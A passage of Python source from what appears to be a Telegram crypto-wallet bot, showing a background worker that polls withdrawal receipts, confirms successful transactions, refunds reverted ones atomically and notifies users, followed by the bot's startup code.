                              AND tx_hash IS NOT NULL
                            ORDER BY id ASC
                            LIMIT 25""",
                        fetch=True,
                    ) or []
                except Exception as e:
                    print(f"[Wallet] receipt poll fetch failed: {e}")
                    pending_receipts = []

                for r in pending_receipts:
                    rwid = r['id']
                    rchain = r['chain']
                    rhash = r['tx_hash']
                    ruser = int(r['telegram_id'])
                    ramount = r['amount']
                    rasset = r['asset']
                    try:
                        st = ob.get_receipt_status(rchain, rhash)
                    except Exception as e:
                        print(f"[Wallet] receipt poll #{rwid} error: {e}")
                        continue
                    if st == 'pending':
                        continue
                    if st == 'success':
                        try:
                            # CAS guard already in place: only flip from
                            # 'broadcast' so a concurrent admin override or
                            # revert-refund cannot be undone.
                            rc = _execute_with_retry(
                                """UPDATE wallet_transactions
                                      SET status='confirmed'
                                    WHERE id=%s AND status='broadcast'""",
                                (rwid,),
                                return_rowcount=True,
                            )
                            if not rc:
                                print(f"[Wallet] confirm CAS lost on #{rwid}")
                                continue
                            url = explorer_tx_url(rchain, rhash)
                            _send_user(
                                ruser,
                                (f"✅ <b>Withdrawal Confirmed!</b>\n"
                                 f"━━━━━━━━━━━━━━━━━━\n"
                                 f"💎 {ramount} {rasset}\n"
                                 f"🔗 {chain_label(rchain)}\n"
                                 f"🆔 <code>{rhash}</code>"),
                                tx_url=url,
                            )
                            print(f"[Wallet] ✅ #{rwid} confirmed on-chain")
                        except Exception as e:
                            print(f"[Wallet] confirm-update #{rwid} failed: {e}")
                        continue
                    if st == 'reverted':
                        # On-chain reverted — refund atomically.
                        refunded = False
                        try:
                            from keep_alive import _wallet_txn
                            with _wallet_txn() as conn:
                                with conn.cursor() as cur:
                                    cur.execute(
                                        """UPDATE wallet_transactions
                                              SET status='failed', note='reverted_on_chain'
                                            WHERE id=%s AND status='broadcast'
                                            RETURNING telegram_id""",
                                        (rwid,),
                                    )
                                    if cur.fetchone():
                                        cur.execute(
                                            """INSERT INTO wallet_balances
                                                   (telegram_id, asset, balance, updated_at)
                                               VALUES (%s, %s, %s, NOW())
                                               ON CONFLICT (telegram_id, asset) DO UPDATE
                                                 SET balance = wallet_balances.balance
                                                             + EXCLUDED.balance,
                                                     updated_at = NOW()""",
                                            (ruser, rasset, str(ramount)),
                                        )
                                        refunded = True
                        except Exception as e:
                            print(f"[Wallet] revert-refund #{rwid} failed: {e}")
                        url = explorer_tx_url(rchain, rhash)
                        if refunded:
                            # Failure DMs don't carry an explorer link per
                            # product spec — the funds are back in-wallet
                            # and we don't want to draw the user toward a
                            # reverted on-chain hash.
                            _send_user(
                                ruser,
                                (f"❌ <b>Withdrawal Reverted On-Chain</b>\n"
                                 f"━━━━━━━━━━━━━━━━━━\n"
                                 f"💎 {ramount} {rasset} refunded to your wallet.\n"
                                 f"🆔 <code>{rhash}</code>"),
                            )
                        _send_owner(
                            f"❌ <b>Withdrawal #{rwid} reverted on-chain</b>\n"
                            f"💎 {ramount} {rasset} on {chain_label(rchain)}\n"
                            f"🆔 <code>{rhash}</code>\n"
                            + ("✅ User refunded." if refunded else "⚠️ Refund failed.")
                        )
                        print(f"[Wallet] ❌ #{rwid} reverted on-chain")

            except Exception as e:
                print(f"[Wallet] Withdrawal worker error: {e}")
            _time.sleep(45)

    withdrawal_thread = threading.Thread(target=_withdrawal_worker, daemon=True)
    withdrawal_thread.start()
    print("⬆️ Withdrawal worker started (polls every 45s)")

    # Start bot
    if not BOT_TOKEN:
        print("❌ ERROR: BOT_TOKEN is missing!")
        return

    print("✅ Bot is running!")
    print("🚀 Ready to receive commands...")
    print("=" * 80)
    application.run_polling(
        allowed_updates=Update.ALL_TYPES,
        drop_pending_updates=True,
        bootstrap_retries=-1,
    )

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"❌ CRITICAL ERROR: {str(e)}")
        import traceback
        traceback.print_exc()
